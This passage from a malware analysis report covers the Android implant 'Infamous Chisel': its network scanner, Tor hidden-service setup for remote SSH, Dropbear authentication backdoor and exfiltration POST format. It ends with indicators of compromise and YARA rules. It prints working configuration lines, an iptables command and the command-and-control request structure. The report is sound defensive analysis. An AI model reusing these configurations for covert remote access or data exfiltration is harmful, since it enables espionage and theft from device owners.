<li><code>/data/data/com.android.providers.telephony</code></li>
<li><code>/data/data/com.google.android.gm</code></li>
<li><code>/data/system/users/0/</code></li>
</ul>
<p>Along with some military application specific directories.</p>
<h5>Local Area Network Scanning</h5>
<p>Every 172,000 seconds (1 day, 23 hours, 46 minutes, and 20 seconds) the local area network is scanned.</p>
<p><code>netd</code> has a built-in network scanner that is executed by the command line:</p>
<p><code>netd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/</code></p>
<p>The ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol (TCP) ports. Internet Control Message Protocol (ICMP) scanning is disabled due to the <code>noping</code> command line parameter specified.</p>
<p>The scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server. The responses from other ports are also logged.</p>
<div>
<p><em><strong>Note:</strong> This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hosts.</em></p>
<p>On completion of this scan, the <code>.ndata.tmp</code> file is moved to the filename <code>.ndata.csv</code> in the same directory. This file is exfiltrated immediately, and both files removed from the tmp directory.</p>
<p>The contents of this file will appear similar to:</p>
<table>
<tbody>
<tr>
<td>
<p>INTERFACE = eth0</p>
<p>SOURCE = 192.168.0.2</p>
<p>IP begin = 192.168.0.0</p>
<p>IP end = 192.168.0.255</p>
<p>PORTS =</p>
<p>PING off</p>
<p>SCAN tcp</p>
<p>*******start*scan********</p>
<p>&nbsp;</p>
<p>Host 192.168.0.0:</p>
<p>Host 192.168.0.1:</p>
<p>tcp - 135:[</p>
<p>tcp - 139:[</p>
<p>tcp - 443:[</p>
<p>tcp - 445:[</p>
<p>Host 192.168.0.2:</p>
<p>Host 192.168.0.3:</p>
<p>Host 192.168.0.4:</p>
<p>&lt;Remaining hosts omitted for brevity&gt;</p>
</td>
</tr>
</tbody>
</table>
<p>The following command line parameters are present, but only a small portion is used:</p>
<table>
<tbody>
<tr>
<td>
<p>-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help</p>
</td>
</tr>
</tbody>
</table>
<p>Command line help is also included:</p>
<table>
<tbody>
<tr>
<td>
<p>Usage minmap -ip* &lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&gt; -p* &lt;port: 80/port-range: 22,25-125/top&gt; -udp &lt;default tcp&gt; -noping &lt;default yes&gt; -o &lt;out_file&gt; -t &lt;timeout&gt; &lt;-n&gt; -c &lt;try_count&gt; -s &lt;source ip&gt; -i &lt;interface/any&gt; &lt;-h/--help (print this help)</p>
</td>
</tr>
</tbody>
</table>
<h3>td</h3>
<p>The <code>td</code> utility provides Tor directory services and is compiled for ARM with no obvious modifications. The configuration for this is generated by the <code>blob</code> component, used for Tor management, described in the Components (blob) section, and saved at the path <code>/data/local/prx.cfg</code>. This file contains:</p>
<table>
<tbody>
<tr>
<td>
<p>&nbsp;</p>
<p>SocksPort 127.0.0.1:1129 PreferSOCKSNoAuth%sExitPolicy reject *:*</p>
<p>DataDirectory /data/local/prx/</p>
<p>RunAsDaemon 1</p>
<p>HiddenServiceDir /data/local/prx/hs/</p>
<p>HiddenServicePort 34371 127.0.0.1:34371</p>
</td>
</tr>
</tbody>
</table>
<p>This configuration provides a Socket Secure version 4 (SOCKS4) connection on the local port <code>1129</code> enabling the Tor network to be used. The <code>blob</code> component uses this for network connectivity checks.</p>
<p>The hidden service port is set to <code>34371</code> with the directory for hidden service information being set to <code>/data/local/prx/hs/</code>.</p>
<p>During the execution of <code>td</code> an <code>.onion</code> domain for a hidden service is randomly generated at the path <code>/data/local/prx/hs/hostname</code> which is then exfiltrated by <code>netd</code>. The <code>db</code> component performs further configuration detailed in the Multi-call binaries (Watchdog<u>)</u>&nbsp;section of this report to enable a SSH connection via this <code>.onion</code> domain. This gives the actor the ability to create an SSH session by connecting to the hidden service across Tor.</p>
<h3>blob</h3>
<p>The <code>blob</code> component is responsible for configuring Tor services and checking network connectivity. Every 15 seconds the <code>tmp</code> directory is checked for the <code>blob</code> utility, and if found, it is moved to the <code>/data/local</code> directory from the <code>/data/local/tmp/blob</code> directory, overwriting any existing version. Every 6,000 seconds (1 hour and 40 minutes) <code>blob</code> is then run from the <code>/data/local</code> directory.</p>
<p><code>netd</code> executes <code>blob</code> which is responsible for configuring and executing Tor services provided by <code>td</code>. When run, it performs the following actions:</p>
<ol>
<li>Checks local host for the port <code>1129</code> being open, exiting if it is.</li>
<li>Checks for the existence of <code>/data/local/td</code>. If this is not present, extracts it from <code>/data/local/td.bz2</code> (bzip2 compressed data).</li>
<li>Creates the configuration file at the path: <code>/data/local/prx.cfg</code>.&nbsp;The contents of which are detailed in the Components (td)&nbsp;section above.</li>
<li><code>td</code> is executed with this configuration file being supplied with the <code>-f</code> command line parameter: <code>/data/local/td -f /data/local/prx.cfg</code>.</li>
<li><code>db</code> the modified Dropbear SSH utility is checked for at the path <code>/data/local/db</code>. If this file is not present, it is extracted from <code>/data/local/db.bz2</code>. db is then executed immediately after, with no command line parameters being passed.</li>
<li><code>blob</code> then enters a loop where it performs a network connectivity check against the domain <code>www.geodatatool[.]com</code> connecting on the local SOCKS4 address provided by the td utility <code>127.0.0[.]1:1129</code> every 3 minutes.</li>
<li>It checks the second byte of the response from this domain to be the character <code>Z (0x5a)</code> to validate a legitimate response has been received from the server. Nothing further is done with the data; this is simply an internet connection check.</li>
<li>If this request fails or the server doesn’t return the expected data, <code>blob</code> terminates the execution of <code>td</code>.</li>
</ol>
<h3>tcpdump</h3>
<p>The <code>tcpdump</code> utility (version <code>4.1.1</code>) is compiled for ARM with no obvious modifications. This provides traffic capturing and monitoring functionality via the command line.</p>
<h3>Multi-call binaries: db, NDBR_armv7l and NDBR_i686</h3>
<p>The <code>db</code> utility contains multiple individual utilities which are selected based on the command line parameters supplied:</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Utility</strong></p>
</td>
<td>
<p><strong>Actor</strong></p>
</td>
<td>
<p><strong>Modified</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>dropbear</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>Yes</p>
</td>
<td>
<p>Dropbear SSH client with modified authentication functions as described in ‘<a href="#_Dropbear_function_modifications">Components (Multi-call binaries: db, NDBR_armv7l and NDBR_i686)</a>’</p>
</td>
</tr>
<tr>
<td>
<p>dropbearkey</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>Generates SSH keys</p>
</td>
</tr>
<tr>
<td>
<p>nmap</p>
</td>
<td>
<p>Yes</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>Network scanning and mapping utility which appears to be actor developed, as opposed to the open source Nmap project</p>
</td>
</tr>
<tr>
<td>
<p>scp</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>No</p>
</td>
<td>
<p>File-copying utility</p>
</td>
</tr>
<tr>
<td>
<p>watchdog</p>
</td>
<td>
<p>Yes</p>
</td>
<td>
<p>N/A</p>
</td>
<td>
<p>Creates directories, flag file and sets up the IP Tables rules</p>
</td>
</tr>
<tr>
<td>
<p>rmflag</p>
</td>
<td>
<p>Yes</p>
</td>
<td>
<p>N/A</p>
</td>
<td>
<p>Removes the flag file</p>
</td>
</tr>
<tr>
<td>
<p>mkflag</p>
</td>
<td>
<p>Yes</p>
</td>
<td>
<p>N/A</p>
</td>
<td>
<p>Creates directories</p>
</td>
</tr>
</tbody>
</table>
<p>The command line help for <code>dropbear</code>, <code>dropbearkey</code>, <code>nmap</code> and <code>scp</code> can be found in the Appendix&nbsp;Section of this report.</p>
<p><code>dropbear</code>, present within <code>db</code>, provides secure shell access to the device via the Tor hidden service. IP Tables rules configured allow incoming TCP connections destined for port <code>34371</code> through the firewall. The Tor utility executed by <code>blob</code> on the device is configured to provide a hidden service on this port, then forward connections to the local <code>dropbear</code> instance. The <code>.onion</code> address has already been exfiltrated enabling the actor to connect to it. Modifications have been made to <code>dropbear</code> authentication mechanisms.</p>
<p>The <code>scp</code> utility does not appear to have been modified. The <code>nmap</code> utility has the same functionality as the version in <code>netd</code> but is executed manually by actor interaction.</p>
<p>The <code>watchdog</code>, <code>rmflag</code>, and <code>mkflag</code> utilities appear to be additional actor-created code that has been incorporated to perform some configuration for <code>dropbear</code>.</p>
<p>The directory <code>sessions.log.d</code> is created under <code>/data/local/tmp/</code>, and puts all standard Dropbear files under this directory alongside the custom actor file <code>remove_file.flag</code>.</p>
<h4>Watchdog</h4>
<p>The <code>watchdog</code> utility performs setup and executes <code>dropbear</code>. This setup includes:</p>
<h5>File and directory creation</h5>
<ul>
<li><code>/data/local/tmp/sessions.log.d</code></li>
<li><code>/data/local/tmp/sessions.log.d/.ssh</code></li>
<li><code>/data/local/tmp/sessions.log.d/.ssh/remove_file.flag</code></li>
</ul>
<p>The <code>remove_file.flag</code>&nbsp;file is created containing the string <code>run</code> when any of the multi-call utilities run Dropbear. This will be collected and exfiltrated by&nbsp;<code>netd</code>&nbsp;giving the actor an indicator that the SSH server is active.</p>
<h5>Authorized hosts setup</h5>
<p>A host key is placed into the directory:</p>
<p><code>/data/local/tmp/sessions.log.d/.ssh/authorized_keys</code></p>
<h5>IP Tables Rules</h5>
<p><code>/usr/sbin/iptables</code> is executed with the parameters:</p>
<p><code>-A INPUT -p tcp --dport 34371 -j ACCEPT -I</code></p>
<h4>mkflag</h4>
<p>The <code>mkflag</code> utility creates the directories and files that <code>watchdog</code> creates but does not perform any host file or IP table manipulation, and then runs <code>dropbear</code>.</p>
<h4>rmflag</h4>
<p>The <code>rmflag</code> utility deletes <code>/data/local/tmp/sessions.log.d/.ssh/remove_file.flag</code></p>
<h4>Modified Dropbear functions</h4>
<p>The actor has modified authentication mechanisms in Dropbear.</p>
<h5>fill_passwd</h5>
<p>The Dropbear function <code>fill_passwd</code> is used to verify that a supplied username is a valid account and return information required to process authentication.</p>
<p>The unmodified source code for this can be found in the Appendix (Dropbear fill_passwd function)&nbsp;Section of this report.</p>
<p>This function calls multiple Linux library functions, <code>getpwnam</code>, <code>getspnam</code>, <code>getpwuid</code>, but in the modified version actor replacement functions are called instead, each of these are discussed below.</p>
<h5>getpwnam</h5>
<p><code>getpwnam</code> Linux library function accepts a username and cross-references it with the passwd file usually stored at <code>/etc/passwd</code> for the corresponding entry containing the colon concatenated fields:</p>
<ul>
<li><code>username</code></li>
<li><code>user password</code></li>
<li><code>user ID</code></li>
<li><code>group ID</code></li>
<li><code>user information</code></li>
<li><code>home directory</code></li>
<li><code>shell program</code></li>
</ul>
<p>On most modern systems, an <code>x</code> in the <code>user password</code> field is used to denote that the password hash is stored in the <code>/etc/shadow</code> file that requires root privileges to read. On an Android device, there are typically no such files, so the structure that would usually be retrieved from the <code>passwd</code> file is generated instead.</p>
<p>The actor has replaced this function with their own, where if a particular username is seen it returns a hard-coded response. If the expected username is not seen, the <code>/etc/passwd</code> file is checked for the corresponding username as normal.</p>
<h5>getpwuid</h5>
<p><code>getpwuid</code> Linux library accepts a uid and returns the corresponding structure above typically from the <code>/etc/passwd</code> file. The actor has replaced this function to check for the <code>uid</code> of <code>0xbeef</code> and return the hard-coded structure detailed above, if found. If <code>0xbeef</code> is not seen, it will revert to checking <code>/etc/passwd</code>.</p>
<h5>getspnam</h5>
<p><code>getspnam</code> Linux library function accepts a username and cross-references it with the shadow file usually stored at <code>/etc/shadow</code> for the corresponding entry that contains the dollar concatenated fields:</p>
<ul>
<li><code>id</code></li>
<li><code>salt</code></li>
<li><code>hash</code></li>
</ul>
<p>Typically, on an Android device, this function would return NULL, but the actor replacement function uses the Linux version.</p>
<p>There does not appear to be any modifications other than those detailed above, but there may be other patches implemented.</p>
<h4>NDBR</h4>
<p>The <code>NDBR_armv7l</code> and <code>NDBR_i686</code> utilities contain multiple individual utilities compiled for ARM and x86 respectively. They both include the above authentication mechanism modification, although with different credentials, and otherwise appear to be the same.</p>
<p>These utilities also have some functionality overlap with the <code>VPNFilter</code> malware but appear to be an evolution.<a href="//blog.talosintelligence.com/vpnfilter-part-3/">[1]</a></p>
<h3>killer</h3>
<p><code>killer</code> is a simple program, the main purpose of which is to terminate <code>netd</code>.</p>
<p>It achieves this by performing the following steps:</p>
<ol>
<li>Iterates through all Process Identifiers (PIDs) in the range 2 through to <code>0x3FFFFF</code>.</li>
<li>Checks the first line of <code>/proc/&lt;pid&gt;/status</code> for the string <code>netd</code>.</li>
<li>Checks the target of the link referenced at <code>/proc/&lt;pid&gt;/exe</code> against <code>netd</code>.</li>
<li>Checks the executable name is not <code>netd_</code> (The legitimate backup executed by the malicious <code>netd</code>).</li>
<li>Terminates the malicious netd leaving the legitimate <code>netd_</code> running.</li>
</ol>
<div>
<h2>Communications</h2>
</div>
<h3>netd file exfiltration</h3>
<p>When a file is to be exfiltrated, a Transport Layer Security (TLS) connection is initiated to a hard-coded local IP and port.</p>
<div>
<p><em><strong>Note:</strong> This local IP address is likely a local port forward to relay the network traffic over a secure channel, such as a Virtual Private Network (VPN) configured on the device. VPN services are often configured in this way, giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network traffic.</em></p>
</div>
<p>If a connection to the local IP and port fails, a hard-coded domain is used as a fallback connection. The IP address for this domain is resolved using a request to <code>dns.google</code>.</p>
<table>
<tbody>
<tr>
<td>
<p>POST /dns-query HTTP/1.1</p>
<p>Host: dns.google</p>
<p>User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</p>
<p>Accept: application/dns-message</p>
<p>Content-Type: application/dns-message</p>
<p>Content-Length:</p>
</td>
</tr>
</tbody>
</table>
<div>
<p><em><strong>Note:</strong> The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device. But since all the communications are under TLS, it would make inspecting the HTTP headers difficult.</em></p>
</div>
<p>The following HTTP Post request is used to exfiltrate data:</p>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<th scope="col" role="columnheader" data-tablesaw-priority="persist">
<p><strong>Data structure</strong></p>
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>POST /server.php?ver=16&amp;<strong>bid</strong>=%s&amp;<strong>type</strong>=%d HTTP/1.1</p>
<p>User-Agent: curl/7.47</p>
<p>Host:</p>
<p><strong>Path</strong>: %s</p>
<p>Content-Type: application/octet-stream</p>
<p><strong>Content-Length</strong>: %d</p>
<p>&nbsp;</p>
<p><strong>&lt;Raw File&gt;</strong></p>
</td>
</tr>
</tbody>
</table>
<div>
<table>
<tbody>
<tr>
<td>
<p>Android ID</p>
</td>
<td>
<p>Type: 0 or 1</p>
</td>
<td>
<p>Base64 encoded file path</p>
</td>
</tr>
<tr>
<td>
<p>Content Length of the encoded file to be exfiltrated</p>
</td>
<td>
<p>File contents</p>
</td>
<td>
<p>&nbsp;</p>
</td>
</tr>
</tbody>
</table>
<ul>
<li>&nbsp;The Android ID is generated by the initial script run, using the command <code>settings get secure android_id</code>.</li>
<li><code>Type</code> denotes the exfiltration type:
<ul>
<li><code>0</code> is used for the file searches, triage script and configurations files.</li>
<li><code>1</code> is used for other information such as the Tor domain.</li>
</ul>
</li>
</ul>
<div>
<h2>Conclusion</h2>
</div>
</div>
</div>
<p>The Infamous Chisel components are low to medium sophistication and appear to have been developed with little regard to defense evasion or concealment of malicious activity.</p>
<p>The searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks. Although the components lack basic obfuscation or stealth techniques to disguise activity, the actor may have deemed this not necessary, since many Android devices do not have a host-based detection system.</p>
<p>Two interesting techniques are present in Infamous Chisel:</p>
<ul>
<li>the replacement of the legitimate <code>netd</code> executable to maintain persistence.</li>
<li>the modification of the authentication function in the components that include <code>dropbear</code>.</li>
</ul>
<p>These techniques require a good level of C++ knowledge to make the alterations and an awareness of Linux authentication and boot mechanisms.</p>
<p>Even with the lack of concealment functions, these components present a serious threat because of the impact of the information they can collect.</p>
<div>
<h2>Detection</h2>
<h3>Indicators of Compromise</h3>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Type</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Values</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>netd POST Request</p>
</td>
<td>
<p>C2 communication</p>
</td>
<td>
<p>POST /server.php?ver=16&amp;bid=%s&amp;type=%d HTTP/1.1\r\n</p>
<p>User-Agent: curl/7.47\r\n</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Relocated legitimate netd</p>
</td>
<td>
<p>/system/bin/netd_</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>IP address information</p>
</td>
<td>
<p>/data/local/tmp/.syscache.csv</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Application list</p>
</td>
<td>
<p>/data/local/tmp/.syspackages.csv</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Getprop output</p>
</td>
<td>
<p>/data/local/tmp/.sysinfo.csv</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Android ID</p>
</td>
<td>
<p>/data/local/tmp/.aid.cache</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Triage shell script</p>
</td>
<td>
<p>/data/local/tmp/.android.cache.sh</p>
</td>
</tr>
<tr>
<td>
<p>netd Paths</p>
</td>
<td>
<p>Exfiltrated file hash list location</p>
</td>
<td>
<p>/sdcard/Android/data/.google.index</p>
<p>/storage/emulated/0/Android/data/.google.index</p>
<p>/storage/emulated/1/Android/data/.google.index</p>
</td>
</tr>
<tr>
<td>
<p>netd_ Process Listing Name</p>
</td>
<td>
<p>Renamed legitimate netd</p>
</td>
<td>
<p>netd_</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/td</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Configuration file path</p>
</td>
<td>
<p>/data/local/prx.cfg</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Configuration file directory</p>
</td>
<td>
<p>/data/local/prx</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Tor generated files</p>
</td>
<td>
<p>/data/local/prx/cached-certs</p>
<p>/data/local/prx/cached-microdesc-consensus</p>
<p>/data/local/prx/cached-microdescs</p>
<p>/data/local/prx/cached-microdescs.new</p>
<p>/data/local/prx/lock</p>
<p>/data/local/prx/state</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Configuration file directory</p>
</td>
<td>
<p>/data/local/prx/hs</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Hidden service path</p>
</td>
<td>
<p>/data/local/prx/hs/hostname</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Public key</p>
</td>
<td>
<p>/data/local/prx/hs/hs_ed25519_public_key</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Private key</p>
</td>
<td>
<p>/data/local/prx/hs/hs_ed25519_secret_key</p>
</td>
</tr>
<tr>
<td>
<p>td Paths</p>
</td>
<td>
<p>Compressed installer file</p>
</td>
<td>
<p>td.bz2</p>
</td>
</tr>
<tr>
<td>
<p>blob Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/blob</p>
</td>
</tr>
<tr>
<td>
<p>blob Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>blob</p>
</td>
</tr>
<tr>
<td>
<p>killer Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/killer</p>
</td>
</tr>
<tr>
<td>
<p>db Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/db</p>
</td>
</tr>
<tr>
<td>
<p>db Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>db</p>
</td>
</tr>
<tr>
<td>
<p>NDBR_armv7l Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/NDBR_armv7l</p>
</td>
</tr>
<tr>
<td>
<p>NDBR_armv7l Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>NDBR_armv7l</p>
</td>
</tr>
<tr>
<td>
<p>NDBR_i686 Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/NDBR_i686</p>
</td>
</tr>
<tr>
<td>
<p>NDBR_i686 Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>NDBR_i686</p>
</td>
</tr>
</tbody>
</table>
<h3>Indicators of Compromise Suspicious in the Context of an Android Device</h3>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<thead>
<tr>
<td>
<p><strong>Type</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Values</strong></p>
</td>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>td Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>td</p>
</td>
</tr>
<tr>
<td>
<p>td Local Port</p>
</td>
<td>
<p>Port open socks</p>
</td>
<td>
<p>127.0.0[.]1:1129</p>
</td>
</tr>
<tr>
<td>
<p>td Local Port</p>
</td>
<td>
<p>Port open hidden service</p>
</td>
<td>
<p>127.0.0[.]1:34371</p>
</td>
</tr>
<tr>
<td>
<p>tcpdump Paths</p>
</td>
<td>
<p>Binary path</p>
</td>
<td>
<p>/data/local/tcpdump</p>
</td>
</tr>
<tr>
<td>
<p>tcpdump Process Listing Name</p>
</td>
<td>
<p>Process list entry</p>
</td>
<td>
<p>tcpdump</p>
</td>
</tr>
<tr>
<td>
<p>blob Domain</p>
</td>
<td>
<p>Domain communication</p>
</td>
<td>
<p>www.geodatatool[.]com</p>
</td>
</tr>
<tr>
<td>
<p>db IP Tables</p>
</td>
<td>
<p>IP tables</p>
</td>
<td>
<p>Port 34371 Present</p>
</td>
</tr>
</tbody>
</table>
<h3>Rules and Signatures</h3>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Unique paths created by netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_CreatedFiles {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "Unique file paths created by netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp; &nbsp;$ = "/data/local/tmp/.aid.cache"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.syscache.csv"&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.syspackages.csv"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.sysinfo.csv"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.ndata.csv"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.ndata.tmp"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/tmp/.android.cache.sh"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>Application directories strings searched by netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_ScrapedApps {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp; &nbsp;author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "Application directories strings searched by netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/com.android.providers.contacts"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/com.android.providers.telephony"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/com.google.android.gm"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/de.blinkt.openvpn"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/eu.thedarken.wldonate"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/net.openvpn.openvpn"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/org.telegram.messenger"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/data/org.thoughtcrime.securesms"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>POST request strings present in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_Uri {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "POST request strings present in netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "POST /server.php?ver=16&amp;bid=%s&amp;type=%d"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "User-Agent: curl/7.47"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>db and td path strings found in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_Paths {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "db and td path strings found in netd"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/db"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/prx.cfg"</p>
<p>&nbsp;&nbsp;&nbsp; $ = "/data/local/td"</p>
<p>&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and all of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<th scope="row">
<p><strong>Description</strong></p>
</th>
<td>
<p>File extension list string found in netd</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Precision</strong></p>
</th>
<td>
<p>High Confidence – no hits in VirusTotal</p>
</td>
</tr>
<tr>
<th scope="row">
<p><strong>Rule type</strong></p>
</th>
<td>
<p>YARA</p>
</td>
</tr>
<tr>
<td>
<p>&nbsp;</p>
</td>
<td>
<p>rule netd_FileExtensionString {</p>
<p>&nbsp; meta:</p>
<p>&nbsp;&nbsp;&nbsp; author = "NCSC"</p>
<p>&nbsp;&nbsp;&nbsp; description = "File extension strings"</p>
<p>&nbsp;&nbsp;&nbsp; date = "2023-08-31"</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ = ".dat,.bak,.xml,.txt,.ovpn,.xml,wa.db,msgstore.db,.pdf,.xlsx,.csv,.zip,telephony.db,.png,.jpg,.jpeg,.kme,database.hik,database.hik-journal,ezvizlog.db,cache4.db,contacts2.db,.docx,.gz,.rar,.tar,.7zip,.zip,.kmz,locksettings.db,mmssms.db,telephony.db,signal.db,mmssms.db,profile.db,accounts.db,PyroMsg.DB,.exe,.kml"</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint32(0) == 0x464C457F and any of them</p>
<p>}</p>
</td>
</tr>
</tbody>
</table>
